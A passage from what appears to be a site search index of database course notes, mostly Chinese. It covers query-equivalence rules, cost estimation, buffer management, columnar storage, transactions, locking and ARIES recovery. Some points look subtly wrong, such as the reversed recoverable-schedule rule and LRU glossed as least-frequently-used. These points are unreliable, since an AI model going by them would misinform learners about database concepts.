\u6d41\u6c34\u7ebf\uff1a\u540c\u65f6\u8bc4\u4f30\u591a\u4e2a\u64cd\u4f5c","title":"Evaluation"},{"location":"course/db/query/#optimization","text":"","title":"Optimization"},{"location":"course/db/query/#equivalence-rule","text":"Conjunctive selection operations can be deconstructed into a sequence of indicidual selections \\(\\sigma_{\\theta_1\\land\\theta_2}(E)=\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(E))\\) Selection operations are commutative \\(\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(E)) = \\sigma_{\\theta_2}(\\sigma_{\\theta_1}(E))\\) Only the last in a sequence of projection operations is needed, the others can be ommitted. \\(\\Pi_{L_1}(\\Pi_{L_2}(...(\\Pi_{L_n}(E))...))=\\Pi_{L_1}(E)\\) Selections can be combined with Cartesian products and theta joins. (1) \\(\\sigma_{\\theta}(E_1\\times E_2) = E_1 \\bowtie_\\theta E_2\\) (2) \\(\\sigma_{\\theta_1}(E_1\\bowtie_{\\theta_2} E_2)=E_1\\bowtie_{\\theta_1\\land\\theta_2}E_2\\) Theta-join operations (and natural joins) are commutative. \\(E_1\\bowtie_\\theta E_2 = E_2\\bowtie_\\theta E_1\\) Natural join operatins are associative \\((E_1\\bowtie E_2)\\bowtie E_3 = E_1\\bowtie(E_2\\bowtie E_3)\\) , Theta joins are associative in the following manner \\((E_1\\bowtie_{\\theta_1} E_2)\\bowtie_{\\theta_2\\land\\theta_3} E_3 = E_1\\bowtie_{\\theta_1\\land \\theta_3}(E_2\\bowtie_{\\theta_2} E_3)\\) , where \\(theta_2\\) involves attributes from only \\(E_2\\) and \\(E_3\\) . The selection operation distributes over the theta join operation under the following two conditions: (1) When all the attributes in \\(\\theta_0\\) involve only the attributes of one of the expressions ( \\(E_1\\) ) being joined \\(\\sigma_{\\theta_0}(E_1\\bowtie_{\\theta}E_2)=(\\sigma_{\\theta_0}(E_1))\\bowtie_\\theta E_2\\) (2) When \\(\\theta_1\\) involves only the attributes of \\(E_1\\) and \\(\\theta_2\\) involves only the attributes of \\(E_2\\) . \\(\\sigma_{\\theta_1\\land \\theta_2}(E_1\\bowtie_{\\theta}E_2)=(\\sigma_{\\theta_1}(E_1))\\bowtie_{\\theta}(\\sigma_{\\theta_2}(E_2))\\) The projetion operation distributes over the theta join operation as follows: (1) if \\(\\theta\\) involves only attributes from \\(L_1 \\cup L2\\) : \\(\\Pi_{L1\\cup L_2}(E_1\\bowtie_{\\theta}E_2)=(\\Pi_{L_1}(E_1))\\bowtie_{\\theta}(\\Pi_{L_2}(E_2))\\) (2) Consider a join \\(E_1\\bowtie_\\theta E_2\\) . (3) Let \\(L_1\\) and \\(L_2\\) be sets of attributes from \\(E_1\\) and \\(E_2\\) respectively (4) Let \\(L_3\\) be attributes of \\(E_1\\) that are involved in join condition \\(\\theta\\) , but are not in \\(L_1 \\cup L_2\\) (5) Let \\(L_4\\) be attributes of \\(E_2\\) that are involved in join condition \\(\\theta\\) , but are not in \\(L_1\\cup L_2\\) \\(\\Pi_{L_1\\cup L_2}(E_1\\bowtie_\\theta E_2)=\\Pi_{L_1\\cup L_2}((\\Pi_{L_1\\cup L_3}(E_1))\\bowtie_\\theta(\\Pi_{L2\\cup L_4}(E_2)))\\) The set operations union and intersection are commutative \\(E_1 \\cup E_2 = E_2 \\cup E_1\\) , \\(E_1\\cap E_2 = E_2 \\cap E_1\\) Set union and intersection are assocative \\((E_1\\cup E_2)\\cup E_3 = E_1 \\cup (E_2\\cup E_3)\\) , \\((E_1\\cap E_2)\\cap E_3=E_1\\cap(E_2\\cap E_3)\\) The selection operation distributes over \\(\\cap\\) , \\(\\cup\\) and \\(-\\) \\(\\sigma_\\theta(E_1-E_2)=\\sigma_\\theta(E_1)-\\sigma_\\theta(E_2)\\) The projection operation distributes over union \\(\\Pi_{L}(E_1\\cup E_2)=(\\Pi_L(E_1))\\cup (\\Pi_{L}(E_2))\\)","title":"Equivalence Rule(\u7b49\u4ef7\u5173\u7cfb\u8868\u8fbe\u5f0f)"},{"location":"course/db/query/#cost-estimation","text":"\u57fa\u672c\u6982\u5ff5 \\(n_r\\) : number of tuples in a relation \\(r\\) \\(b_r\\) : number of blocks containing tuples of \\(r\\) \\(l_r\\) : size of a tuple of \\(r\\) \\(f_r\\) : blocking factor of \\(r\\) \\(V(A,r)\\) : number of distinct values that appear in \\(r\\) for attribute \\(A\\) ; same as the size of \\(\\Pi_A(r)\\) \\(b_r=\\lceil \\frac{n_r}{f_r} \\rceil\\) \u7b97\u6cd5\u4f30\u8ba1 \u9009\u62e9\u4f30\u8ba1 \\(\\sigma_{A=v}(r)\\) \u4e00\u822c\u5047\u8bbe\u4e3a\u5747\u5300\u5206\u5e03 \\(n_r/V(A,r)\\) \u590d\u6742\u9009\u62e9\u4f30\u8ba1 \u5408\u53d6 \\(\\sigma_{\\theta_1\\land \\theta_2\\land\\dots\\land\\theta_n(r)}\\) : \\(n_r\\cdot\\frac{s_1\\cdot s_2\\dots s_n}{n_r^n}\\) \u6790\u53d6 \\(\\sigma_{\\theta_1\\lor \\theta_2\\lor\\dots\\lor\\theta_n(r)}\\) : \\(n_r\\cdot(1-(1-\\frac{s_1}{n_r})(1-\\frac{s_2}{n_r})\\dots(1-\\frac{s_n}{n_r}))\\) \u8fde\u63a5\u4f30\u8ba1 \\(r\\bowtie s\\) \u82e5\u4e24\u4e2a\u5173\u7cfb\u65e0\u5171\u540c\u5c5e\u6027: \\(n_r \u00b7 n_s\\) \u82e5\u5171\u540c\u5c5e\u6027\u662fr\u7684key: \\({\\rm size} \\le n_s\\) \u82e5\u5171\u540c\u5c5e\u6027\u662fs\u5230r\u7684foregin key: \\(n_s\\) \u82e5\u5171\u540c\u5c5e\u6027\u4e0d\u662fkey: \\(\\min(\\frac{n_s\\cdot n_r}{V(A,s)}, \\frac{n_s\\cdot n_r}{V(A,r)})\\) \u6295\u5f71: \\(\\Pi(s)\\) : \\(V(A,r)\\) \u805a\u5408: \\(\\mathcal{G}(s)\\) : \\(V(A,r)\\) \u96c6\u5408\uff1a\u8f6c\u6362\u4e3a\u5408\u53d6\u548c\u6790\u53d6 Heuristic Optimization \u63a2\u7d22\u5f0f\u7684\u4f18\u5316 \u5c3d\u65e9\u8fdb\u884cselection \u5c3d\u65e9\u8fdb\u884cprojection \u9009\u62e9\u6700\u4e25\u683c\u7684selection\u548coperations\u64cd\u4f5c","title":"Cost Estimation(\u7ed3\u679c\u96c6\u5927\u5c0f\u4f30\u8ba1)"},{"location":"course/db/storage/","text":"Database Storage Database\u7684\u5b58\u50a8\u7ed3\u6784\u53ef\u7531\u4e0b\u56fe\u6240\u793a\uff1a Buffer Manager \u901a\u8fc7\u5c06\u6570\u636e\u653e\u5230\u4e3b\u5b58(Memory)\u4e2d\u6765\u63d0\u9ad8\u8bbf\u95ee\u6548\u7387\u3002 buffer manager\uff1a\u7528\u4e8e\u7ba1\u7406\u7f13\u51b2\u533a\u4e2d\u7684\u5185\u5b58\u5206\u914d\u3002 \u6d89\u53ca\u5230buffer\u7684\u66ff\u6362\u7b97\u6cd5\u3002 LRU strategy\uff1a\u66ff\u6362\u6389\u6700\u8fd1\u4f7f\u7528\u9891\u7387\u6700\u4f4e\u7684block FIFO\uff1a\u5148\u8fdb\u5148\u51fa Random\uff1a\u968f\u673a\u66ff\u6362 Clock: LRU\u7684\u7ea6\u7b80\u7248\uff0c\u6709\u4e00\u4e2areference bit(second chance bit) \u5c06\u6570\u636e\u4ece\u4e3b\u5b58\u5199\u5165\u5916\u5b58\u540e\u624d\u7b97\u662f\u7a33\u5b9a\u5b58\u50a8\uff08\u6389\u7535\u4e0d\u5931\uff09\u3002 Column-Oriented Storage \u884c\u5b58\u50a8 (row-oriented representation)\u662f\u6700\u57fa\u672c\u7684\u5b58\u50a8\u65b9\u6cd5\uff0c\u5373\u5c06\u8868\u4e2d\u7684\u6570\u636e\u4e00\u6761\u4e00\u6761\u5b58\u50a8\u3002\u800c \u5217\u5b58\u50a8 (column-oriented Storage)\u5728\u6709\u65f6\u53ef\u4ee5\u53d1\u6325\u66f4\u5927\u7684\u529f\u6548\u3002\u5f53\u7136\u6709\u65f6\u5019\u53ef\u80fd\u4e5f\u4f1a\u91c7\u53d6\u884c\u5217\u6df7\u5408\u5b58\u50a8\u7684\u65b9\u5f0f\uff08hybrid row/column stores\uff09\u3002\u5217\u5b58\u50a8\u65b9\u5f0f\u5982\u4e0b\u56fe\u6240\u793a\uff1a Benefit Reduced IO if only some attributes are accessed Improved CPU cache performance Improved compression Vector processing on modern CPU architectures Drawbacks Cost of tuple reconstruction from columnar representation Cost of tuple deletion and update Cost of decompression \u884c\u5b58\u50a8&\u5217\u5b58\u50a8\u5bf9\u6bd4","title":"Database Storage"},{"location":"course/db/storage/#database-storage","text":"Database\u7684\u5b58\u50a8\u7ed3\u6784\u53ef\u7531\u4e0b\u56fe\u6240\u793a\uff1a","title":"Database Storage"},{"location":"course/db/storage/#buffer-manager","text":"\u901a\u8fc7\u5c06\u6570\u636e\u653e\u5230\u4e3b\u5b58(Memory)\u4e2d\u6765\u63d0\u9ad8\u8bbf\u95ee\u6548\u7387\u3002 buffer manager\uff1a\u7528\u4e8e\u7ba1\u7406\u7f13\u51b2\u533a\u4e2d\u7684\u5185\u5b58\u5206\u914d\u3002 \u6d89\u53ca\u5230buffer\u7684\u66ff\u6362\u7b97\u6cd5\u3002 LRU strategy\uff1a\u66ff\u6362\u6389\u6700\u8fd1\u4f7f\u7528\u9891\u7387\u6700\u4f4e\u7684block FIFO\uff1a\u5148\u8fdb\u5148\u51fa Random\uff1a\u968f\u673a\u66ff\u6362 Clock: LRU\u7684\u7ea6\u7b80\u7248\uff0c\u6709\u4e00\u4e2areference bit(second chance bit) \u5c06\u6570\u636e\u4ece\u4e3b\u5b58\u5199\u5165\u5916\u5b58\u540e\u624d\u7b97\u662f\u7a33\u5b9a\u5b58\u50a8\uff08\u6389\u7535\u4e0d\u5931\uff09\u3002","title":"Buffer Manager"},{"location":"course/db/storage/#column-oriented-storage","text":"\u884c\u5b58\u50a8 (row-oriented representation)\u662f\u6700\u57fa\u672c\u7684\u5b58\u50a8\u65b9\u6cd5\uff0c\u5373\u5c06\u8868\u4e2d\u7684\u6570\u636e\u4e00\u6761\u4e00\u6761\u5b58\u50a8\u3002\u800c \u5217\u5b58\u50a8 (column-oriented Storage)\u5728\u6709\u65f6\u53ef\u4ee5\u53d1\u6325\u66f4\u5927\u7684\u529f\u6548\u3002\u5f53\u7136\u6709\u65f6\u5019\u53ef\u80fd\u4e5f\u4f1a\u91c7\u53d6\u884c\u5217\u6df7\u5408\u5b58\u50a8\u7684\u65b9\u5f0f\uff08hybrid row/column stores\uff09\u3002\u5217\u5b58\u50a8\u65b9\u5f0f\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"Column-Oriented Storage"},{"location":"course/db/storage/#benefit","text":"Reduced IO if only some attributes are accessed Improved CPU cache performance Improved compression Vector processing on modern CPU architectures","title":"Benefit"},{"location":"course/db/storage/#drawbacks","text":"Cost of tuple reconstruction from columnar representation Cost of tuple deletion and update Cost of decompression","title":"Drawbacks"},{"location":"course/db/storage/#_1","text":"","title":"\u884c\u5b58\u50a8&amp;\u5217\u5b58\u50a8\u5bf9\u6bd4"},{"location":"course/db/transaction/","text":"Transaction Basic concepts ACID \u539f\u5b50\u6027(Atomicity): \u4e8b\u52a1\u4e2d\u7684\u6240\u6709\u6b65\u9aa4\u53ea\u80fdcommit\u6216\u8005rollback\u3002 \u4e00\u81f4\u6027(Consistency): \u5355\u72ec\u6267\u884c\u4e8b\u52a1\u53ef\u4ee5\u4fdd\u6301\u6570\u636e\u5e93\u7684\u4e00\u81f4\u6027\u3002 \u9694\u79bb\u6027(Isolation): \u4e8b\u52a1\u5728\u5e76\u884c\u6267\u884c\u7684\u65f6\u5019\u4e0d\u80fd\u611f\u77e5\u5230\u5176\u4ed6\u4e8b\u52a1\u6b63\u5728\u6267\u884c\uff0c\u4e2d\u95f4\u7ed3\u679c\u5bf9\u4e8e\u5176\u4ed6\u6267\u884c\u7684\u4e8b\u52a1\u662f\u9690\u85cf\u7684\u3002 \u6301\u7eed\u6027(Durability): \u66f4\u65b0\u4e4b\u540e\u54ea\u6015\u8f6f\u4ef6\u51fa\u4e86\u95ee\u9898\uff0c\u66f4\u65b0\u7684\u6570\u636e\u4e5f\u5fc5\u987b\u5b58\u5728\u3002 \u72b6\u6001 active\uff1a\u521d\u59cb\u72b6\u6001\uff0c\u6267\u884c\u4e2d\u7684\u4e8b\u52a1\u90fd\u5904\u4e8e\u8fd9\u4e2a\u72b6\u6001\u3002 partially committed\uff1a\u5728\u6700\u540e\u4e00\u53e5\u6307\u4ee4\u88ab\u6267\u884c\u4e4b\u540e\u3002 failed\uff1a\u5728\u53d1\u73b0\u6267\u884c\u5931\u8d25\u4e4b\u540e\u3002 aborted\uff1a\u56de\u6eda\u7ed3\u675f\uff0c\u4f1a\u9009\u62e9\u662f\u91cd\u65b0\u6267\u884c\u4e8b\u52a1\u8fd8\u662f\u7ed3\u675f\u3002 committed\uff1a\u4e8b\u52a1\u88ab\u5b8c\u6574\u7684\u6267\u884c Concurrent Executions serial schedule \u4e32\u884c\u8c03\u5ea6\uff1a\u4e00\u4e2a\u4e8b\u52a1\u8c03\u5ea6\u5b8c\u6210\u4e4b\u540e\u518d\u8fdb\u884c\u4e0b\u4e00\u4e2a equivalent schedule \u7b49\u4ef7\u8c03\u5ea6\uff1a\u6539\u53d8\u5904\u7406\u7684\u987a\u5e8f\u4f46\u662f\u548c\u539f\u6765\u7b49\u4ef7 conflict serializability \u51b2\u7a81\u53ef\u4e32\u884c\u5316 conflict equivalent \uff1a\u4e24\u4e2a\u8c03\u5ea6\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u4e00\u4e9b\u4e0d\u51b2\u7a81\u7684\u6307\u4ee4\u6765\u8f6c\u6362\uff0c\u5c31\u53eb\u505a\u51b2\u7a81\u7b49\u4ef7 conflict serializable \uff1a\u51b2\u7a81\u53ef\u4e32\u884c\u5316\uff1a\u5f53\u4e14\u4ec5\u5f53\u4e00\u4e2a\u8c03\u5ea6S\u53ef\u4ee5\u548c\u4e00\u4e2a\u4e32\u884c\u8c03\u5ea6\u7b49\u4ef7 Precedence graph \u524d\u9a71\u56fe Recoverable Schedules \u53ef\u6062\u590d\u8c03\u5ea6 \u5982\u679c\u4e00\u4e2a\u4e8b\u52a1 \\(T_1\\) \u8981\u8bfb\u53d6\u67d0\u4e00\u90e8\u5206\u6570\u636e\uff0c\u800c \\(T_2\\) \u8981\u5199\u5165\u540c\u4e00\u90e8\u5206\u7684\u6570\u636e\uff0c\u5219 \\(T_1\\) \u5fc5\u987b\u5728 \\(T_2\\) commit\u4e4b\u524d\u5c31commit\uff0c\u5426\u5219\u5c31\u4f1a\u9020\u6210dirty read Cascading Rollbacks \u7ea7\u8054\u56de\u6eda: \u5355\u4e2a\u4e8b\u52a1\u7684fail\u9020\u6210\u4e86\u4e00\u7cfb\u5217\u7684\u4e8b\u52a1\u56de\u6eda Cascadeless Schedules \u907f\u514d\u7ea7\u8054\u56de\u6eda\u7684\u8c03\u5ea6 Cascadeless Schedules\u4e5f\u662f\u53ef\u6062\u590d\u7684\u8c03\u5ea6 Concurrency Control Lock-Based Protocols exclusive(X) lock: \u53ef\u8bfb\u53ef\u5199 shared(S) lock: \u53ef\u8bfb\u4e0d\u53ef\u5199 Lock-compatibility matrix Two-Phase Locking Protocol Phase 1: Growing Phase transaction may obtain locks transaction may not release locks Phase 2: Shrinking Phase transaction may release locks transaction may not obtain locks Two-Phase Locking Protocol assures serializability. \u4e24\u4e2a\u53d8\u79cd \u4e25\u683c\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae(strict two-phase locking protocol)\uff1a\u8981\u6c42\u4e8b\u52a1\u6301\u6709\u7684 X \u9501\u5fc5\u987b\u5728 \u4e8b\u52a1\u63d0\u4ea4\u4e4b\u540e\u65b9\u53ef\u91ca\u653e\u3002\u89e3\u51b3\u7ea7\u8054\u56de\u6eda\u7684\u95ee\u9898\u3002 \u5f3a\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae(rigorous two-phase locking protocol)\uff1a\u8981\u6c42\u4e8b\u52a1\u63d0\u4ea4\u524d\u4e0d\u5f97\u91ca\u653e \u4efb\u4f55\u9501\u3002 \u9501\u8f6c\u6362(Lock Conversions)\uff1a\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06 S \u9501\u5347\u7ea7\u4e3a X \u9501\uff0cX \u9501\u964d\u7ea7\u4e3a S \u9501\u7684\u673a\u5236\u3002\u53ea\u80fd\u5728\u589e \u957f\u9636\u6bb5\u5347\u7ea7\uff0c\u7f29\u51cf\u9636\u6bb5\u964d\u7ea7\u3002 DeadLock \u4e92\u76f8\u6301\u6709\u9501\u7684\u65f6\u5019\u89e6\u53d1\u6b7b\u9501 \u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u4e8b\u52a1\u524d\u5c31\u8981\u6c42\u62ff\u5230\u9501\u4ee5\u907f\u514d\u8fd0\u884c\u65f6\u6b7b\u9501\uff08\u5f53\u7136\u8fd9\u6837\u505a\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u6027\u80fd\u4ee3\u4ef7\uff09 \u901a\u8fc7\u753b\u4f9d\u8d56\u56fe\u5224\u65ad\u662f\u5426\u4ea7\u751f\u6b7b\u9501 \u6b7b\u9501\u6062\u590d\uff1a\u9009\u53d6\u4e00\u4e9b\u4e8b\u52a1\u8fdb\u884c\u56de\u6eda\u3002\u5f53\u91cd\u590d\u9009\u53d6\u540c\u6837\u7684\u4e8b\u52a1\u727a\u7272(victim)\u5e76\u4e0d\u65ad\u9677\u5165\u6b7b\u9501\u65f6\uff0c\u5373\u9677\u5165starvation(\u9965\u997f) Recovery System log-based Recovery \u57fa\u4e8e\u65e5\u5fd7\u7684\u6062\u590d \u65e5\u5fd7(log)\u88ab\u5b58\u50a8\u5728\u7a33\u5b9a\u7684\u5b58\u50a8\u4e2d\uff0c\u5305\u542b\u4e00\u7cfb\u5217\u7684\u65e5\u5fd7\u8bb0\u5f55 \u4e8b\u52a1\u5f00\u59cb <T start> \u5199\u64cd\u4f5c\u4e4b\u524d\u4e4b\u524d\u7684\u65e5\u5fd7\u8bb0\u5f55 <Ti, x, V1, V2> (X)\u662f\u5199\u7684\u4f4d\u7f6e\uff0c V1\uff0cV2\u5206\u522b\u662f\u5199\u4e4b\u524d\u548c\u4e4b\u540e\u7684X\u5904\u7684\u503c \u4e8b\u52a1\u7ed3\u675f\u7684\u65f6\u5019\u5199\u5165 <T commit> \u5bf9\u4e8e\u66f4\u65b0\u4e8b\u52a1\u7684\u4e24\u6761\u89c4\u5219 commit rule\uff1a\u65b0\u7684\u6570\u636e\u5728commit\u4e4b\u524d\u5fc5\u987b\u88ab\u5199\u5728 \u975e\u6613\u5931\u6027 \u7684\u5b58\u50a8\u5668\u4e2d logging rule\uff1a\u65e7\u7684\u503c\u5728\u65b0\u7684\u5199\u5165\u4e4b\u524d\u9700\u8981\u88ab\u5199\u5728\u65e5\u5fd7\u91cc Aries\u7b97\u6cd5 Log \u8bb0\u5f55\u4e00\u4e9b\u5fc5\u8981\u4fe1\u606f Page LSN \u6bcf\u4e00\u9875\u7684LSN \u662f\u6bcf\u4e00\u9875\u4e2d\u6700\u540e\u4e00\u6761\u8d77\u4f5c\u7528\u7684\u65e5\u5fd7\u8bb0\u5f55\u7684LSN\u7f16\u53f7 Log Buffer \u8bb0\u5f55\u7684\u7f13\u51b2\u533a\uff0c\u8fd8\u6ca1\u6709\u5199\u5165Stable log Dirty Page Table \u5b58\u50a8\u5728\u7f13\u51b2\u533a\u7684\uff0c\u8bb0\u5f55\u5df2\u7ecf\u88ab\u66f4\u65b0\u8fc7\u7684page\u7684\u8868 \u6bcf\u4e2a\u9875\u7684RecLSN\uff0c\u8868\u793a\u8fd9\u4e00\u9875\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e2d\uff0c\u5728RecLSN\u4e4b\u524d\u7684Log\u5df2\u7ecf\u90fd\u88ab\u5199\u5165Stable log Checkpoint \u8bb0\u5f55\u810f\u9875\u8868\u4fe1\u606f\u548c\u6d3b\u8dc3\u4e8b\u52a1\u7684LastLSN \u548clog-based Recovery\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u4e0d\u4f1a\u628a\u5185\u5b58\u9875\u5199\u5165\u78c1\u76d8 \u6062\u590d\u64cd\u4f5c \u5206\u6790\u9636\u6bb5 \u8bfb\u53d6\u6700\u540e\u4e00\u6761\u5b8c\u6574\u7684checkpoint\u65e5\u5fd7\u8bb0\u5f55\u4fe1\u606f \u8bbe\u7f6eRedoLSN = min RecLSN(\u810f\u9875\u8868\u4e2d\u7684)\uff0c\u5982\u679c\u810f\u9875\u8868\u662f\u7a7a\u7684\u5c31\u8bbe\u7f6e\u4e3acheckpoint\u7684LSN(\u51b3\u5b9a\u4ece\u54ea\u91cc\u5f00\u59cbredo) \u8bbe\u7f6eundo-list\uff1acheckpoint\u4e2d\u8bb0\u5f55\u7684\u4e8b\u52a1 \u8bfb\u53d6undo-list\u4e2d\u6bcf\u4e00\u4e2a\u4e8b\u52a1\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55\u7684LSN \u4ececheckpoint\u5f00\u59cb\u6b63\u5411\u626b\u63cf \u5982\u679c\u53d1\u73b0\u4e86\u4e0d\u5728undo-list\u4e2d\u7684\u8bb0\u5f55\u5c31\u5199\u5165undo-list \u5f53\u53d1\u73b0\u4e00\u6761\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019\uff0c\u5982\u679c\u8fd9\u4e00\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\uff0c\u7528\u8be5\u8bb0\u5f55\u7684LSN\u4f5c\u4e3a RecLSN\u5199\u5165\u810f\u9875\u8868\u4e2d \u5982\u679c\u53d1\u73b0\u4e86\u6807\u5fd7\u4e8b\u52a1\u7ed3\u675f\u7684\u65e5\u5fd7\u8bb0\u5f55(commit, abort) \u5c31\u4eceundo-list\u4e2d\u79fb\u9664\u8fd9\u4e2a\u4e8b\u52a1 Redo\u9636\u6bb5 \u4eceRedoLSN\u5f00\u59cb\u6b63\u5411\u626b\u63cf\uff0c\u5f53\u53d1\u73b0\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019\u5982\u679c\u8fd9\u4e00\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\u3002\u6216\u8005\u8fd9\u4e00\u6761\u8bb0\u5f55\u7684LSN\u5c0f\u4e8e\u9875\u9762\u7684RecLSN\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761 \u5426\u5219\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u8fd9\u4e00\u9875\uff0c\u5982\u679c\u78c1\u76d8\u4e2d\u5f97\u5230\u7684\u8fd9\u4e00\u9875\u7684PageLSN\u6bd4\u8fd9\u4e00\u6761\u8981\u5c0f\uff0c\u5c31redo\uff0c\u5426\u5219\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761\u8bb0\u5f55 Undo\u9636\u6bb5 \u4ece\u65e5\u5fd7\u672b\u5c3e\u5148\u524d\u5411\u524d\u641c\u7d22\uff0cundo\u6240\u6709undo-list\u4e2d\u6709\u7684\u4e8b\u52a1 \u7528\u5206\u6790\u9636\u6bb5\u7684\u6700\u540e\u4e00\u4e2aLSN\u6765\u627e\u5230\u6bcf\u4e2a\u65e5\u5fd7\u6700\u540e\u7684\u8bb0\u5f55 \u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u6700\u5927\u7684LSN\u5bf9\u5e94\u7684\u4e8b\u52a1undo \u5728undo\u4e00\u6761\u8bb0\u5f55\u4e4b\u540e \u5bf9\u4e8e\u666e\u901a\u7684\u8bb0\u5f55\uff0c\u5c06NextLSN\u8bbe\u7f6e\u4e3aPrevLSN \u5bf9\u4e8eCLR\u8bb0\u5f55\uff0c\u5c06NextLSN\u8bbe\u7f6e\u4e3aUndoNextLSN \u5982\u4f55undo\uff1a\u5f53\u4e00\u6761\u8bb0\u5f55undo\u7684\u65f6\u5019 \u751f\u6210\u4e00\u4e2a\u5305\u542b\u6267\u884c\u64cd\u4f5c\u7684CLR \u8bbe\u7f6eCLR\u7684UndoNextLSN\u4e3a\u66f4\u65b0\u8bb0\u5f55\u7684LSN","title":"Transaction"},{"location":"course/db/transaction/#transaction","text":"","title":"Transaction"},{"location":"course/db/transaction/#basic-concepts","text":"","title":"Basic concepts"},{"location":"course/db/transaction/#acid","text":"\u539f\u5b50\u6027(Atomicity): \u4e8b\u52a1\u4e2d\u7684\u6240\u6709\u6b65\u9aa4\u53ea\u80fdcommit\u6216\u8005rollback\u3002 \u4e00\u81f4\u6027(Consistency): \u5355\u72ec\u6267\u884c\u4e8b\u52a1\u53ef\u4ee5\u4fdd\u6301\u6570\u636e\u5e93\u7684\u4e00\u81f4\u6027\u3002 \u9694\u79bb\u6027(Isolation): \u4e8b\u52a1\u5728\u5e76\u884c\u6267\u884c\u7684\u65f6\u5019\u4e0d\u80fd\u611f\u77e5\u5230\u5176\u4ed6\u4e8b\u52a1\u6b63\u5728\u6267\u884c\uff0c\u4e2d\u95f4\u7ed3\u679c\u5bf9\u4e8e\u5176\u4ed6\u6267\u884c\u7684\u4e8b\u52a1\u662f\u9690\u85cf\u7684\u3002 \u6301\u7eed\u6027(Durability): \u66f4\u65b0\u4e4b\u540e\u54ea\u6015\u8f6f\u4ef6\u51fa\u4e86\u95ee\u9898\uff0c\u66f4\u65b0\u7684\u6570\u636e\u4e5f\u5fc5\u987b\u5b58\u5728\u3002","title":"ACID"},{"location":"course/db/transaction/#_1","text":"active\uff1a\u521d\u59cb\u72b6\u6001\uff0c\u6267\u884c\u4e2d\u7684\u4e8b\u52a1\u90fd\u5904\u4e8e\u8fd9\u4e2a\u72b6\u6001\u3002 partially committed\uff1a\u5728\u6700\u540e\u4e00\u53e5\u6307\u4ee4\u88ab\u6267\u884c\u4e4b\u540e\u3002 failed\uff1a\u5728\u53d1\u73b0\u6267\u884c\u5931\u8d25\u4e4b\u540e\u3002 aborted\uff1a\u56de\u6eda\u7ed3\u675f\uff0c\u4f1a\u9009\u62e9\u662f\u91cd\u65b0\u6267\u884c\u4e8b\u52a1\u8fd8\u662f\u7ed3\u675f\u3002 committed\uff1a\u4e8b\u52a1\u88ab\u5b8c\u6574\u7684\u6267\u884c","title":"\u72b6\u6001"},{"location":"course/db/transaction/#concurrent-executions","text":"serial schedule \u4e32\u884c\u8c03\u5ea6\uff1a\u4e00\u4e2a\u4e8b\u52a1\u8c03\u5ea6\u5b8c\u6210\u4e4b\u540e\u518d\u8fdb\u884c\u4e0b\u4e00\u4e2a equivalent schedule \u7b49\u4ef7\u8c03\u5ea6\uff1a\u6539\u53d8\u5904\u7406\u7684\u987a\u5e8f\u4f46\u662f\u548c\u539f\u6765\u7b49\u4ef7 conflict serializability \u51b2\u7a81\u53ef\u4e32\u884c\u5316 conflict equivalent \uff1a\u4e24\u4e2a\u8c03\u5ea6\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u4e00\u4e9b\u4e0d\u51b2\u7a81\u7684\u6307\u4ee4\u6765\u8f6c\u6362\uff0c\u5c31\u53eb\u505a\u51b2\u7a81\u7b49\u4ef7 conflict serializable \uff1a\u51b2\u7a81\u53ef\u4e32\u884c\u5316\uff1a\u5f53\u4e14\u4ec5\u5f53\u4e00\u4e2a\u8c03\u5ea6S\u53ef\u4ee5\u548c\u4e00\u4e2a\u4e32\u884c\u8c03\u5ea6\u7b49\u4ef7 Precedence graph \u524d\u9a71\u56fe Recoverable Schedules \u53ef\u6062\u590d\u8c03\u5ea6 \u5982\u679c\u4e00\u4e2a\u4e8b\u52a1 \\(T_1\\) \u8981\u8bfb\u53d6\u67d0\u4e00\u90e8\u5206\u6570\u636e\uff0c\u800c \\(T_2\\) \u8981\u5199\u5165\u540c\u4e00\u90e8\u5206\u7684\u6570\u636e\uff0c\u5219 \\(T_1\\) \u5fc5\u987b\u5728 \\(T_2\\) commit\u4e4b\u524d\u5c31commit\uff0c\u5426\u5219\u5c31\u4f1a\u9020\u6210dirty read Cascading Rollbacks \u7ea7\u8054\u56de\u6eda: \u5355\u4e2a\u4e8b\u52a1\u7684fail\u9020\u6210\u4e86\u4e00\u7cfb\u5217\u7684\u4e8b\u52a1\u56de\u6eda Cascadeless Schedules \u907f\u514d\u7ea7\u8054\u56de\u6eda\u7684\u8c03\u5ea6 Cascadeless Schedules\u4e5f\u662f\u53ef\u6062\u590d\u7684\u8c03\u5ea6","title":"Concurrent Executions"},{"location":"course/db/transaction/#concurrency-control","text":"Lock-Based Protocols exclusive(X) lock: \u53ef\u8bfb\u53ef\u5199 shared(S) lock: \u53ef\u8bfb\u4e0d\u53ef\u5199 Lock-compatibility matrix Two-Phase Locking Protocol Phase 1: Growing Phase transaction may obtain locks transaction may not release locks Phase 2: Shrinking Phase transaction may release locks transaction may not obtain locks Two-Phase Locking Protocol assures serializability. \u4e24\u4e2a\u53d8\u79cd \u4e25\u683c\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae(strict two-phase locking protocol)\uff1a\u8981\u6c42\u4e8b\u52a1\u6301\u6709\u7684 X \u9501\u5fc5\u987b\u5728 \u4e8b\u52a1\u63d0\u4ea4\u4e4b\u540e\u65b9\u53ef\u91ca\u653e\u3002\u89e3\u51b3\u7ea7\u8054\u56de\u6eda\u7684\u95ee\u9898\u3002 \u5f3a\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae(rigorous two-phase locking 